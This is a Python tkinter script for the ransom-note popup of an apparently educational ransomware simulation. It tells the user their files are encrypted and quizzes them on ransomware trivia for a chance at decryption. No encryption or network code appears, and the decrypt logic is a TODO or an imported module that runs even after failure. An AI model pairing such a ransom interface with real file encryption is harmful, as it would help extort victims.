from tkinter import *
from PIL import Image, ImageTk

# List of question-answer pairs to be prompted to a user
q_and_a = ({"What kind of cyber attack is this?": ("ransomware",)},
           {"When was the first recorded case of a ransomware attack?": 1989},
           {"How much was the largest ransomware payment ever made (in millions)?": ("75", "$75")})

# Sets up window containing an image
window = Tk()
window.title("Riddle me this...")
image = Image.open("Popup.png")
photo = ImageTk.PhotoImage(image)
label = Label(window, image=photo)
label.pack()
window.geometry("572x550")

# Sets up icon image
icon_image = ImageTk.PhotoImage(file="icon.png")
window.iconphoto(False, icon_image)


def clicking_submit():
    """
    The command to be run when the user clicks the Submit button on the GUI. Each time it is clicked,
    it compares the user's input with the valid answers for each question and reduces the number of attempts
    left. Drives the program to either (1) decrypt a users files if they answer all the questions correctly
    or (2) close out and not do anything if a user exhausts their attempts.
    """
    num_correct: int = 0

    # Iterates through each response entry and checks if it aligns with the expected answer
    for index, response in enumerate(response_entries):
        # Retrieves the corresponding user response and answer to a particular question
        response = response_entries[index].get()
        correct_answer = answers[index]

        # Checks if the user neglected to fill in one of the entries
        if response == "":
            print("Incorrect")
            break

        # Determines the format for evaluating if a response is correct based on whether it's fixed (an int)
        # or not fixed (has multiple values in the form of a string)
        if isinstance(correct_answer, int):
            correct = (int(response) == correct_answer)
        else:
            correct = (response.lower() in correct_answer)

        if correct:
            print("Correct!")
            num_correct += 1
            # Updates the flag to tell the program that the user has met the requirements to have their
            # files decrypted
            if num_correct == len(q_and_a):
                print("You win! Decrypting your files now...")
                # Closes out the window and decrypts the user's files
                window.destroy()
                # TODO: Should execute the script to decrypt the encrypted files
        else:
            print("Incorrect.")
            break

    # Allows the program to decrement the variable "attempts_left" at the global level
    global attempts_left
    attempts_left -= 1

    # Updates the label displaying the number of attempts left
    attempt_label.config(text=f"Attempts Left: {attempts_left}")

    # Exits out of program when user exhausts their attempts
    if attempts_left == 0:
        # We import the decrypt.py module to perform
        import decrypt

        print("You ran out of attempts! Good luck decrypting your files!")
        window.destroy()
        decrypt.main()


# Initializes the number of user attempts to be 3
attempts_left: int = 3

# Displays the number of attempts a user has remaining
attempt_label = Label(window, text=f"Attempts Left: {attempts_left}", font=('Arial', 10, 'bold'))
attempt_label.pack(pady=2)

# Stores reference to the entries and labels displayed
response_entries = []
answers = []

# Iterates through each individual question-answer pair in q_and_a
for question_answer_pair in q_and_a:
    # Unpacks the key-value pair from question_answer_pair as the question and answer respectively
    for question, answer in question_answer_pair.items():
        # Displays a question from the dictionary variable "question_answer_pair"
        question_label = Label(window, text=question, font=('Arial', 10, 'bold'))
        question_label.pack(pady=2)

        # Create and pack the entry for each answer
        response_entry = Entry(window, width=30)
        response_entry.pack(pady=5)

        # Adds each
        answers.append(answer)
        response_entries.append(response_entry)

# Creates a button for the user to interact with in the GUI
submit_button = Button(window, text="Submit", command=clicking_submit)
submit_button.pack()

# Used to keep window open and reactive to any events (i.e. clicking the submit button)
window.mainloop()
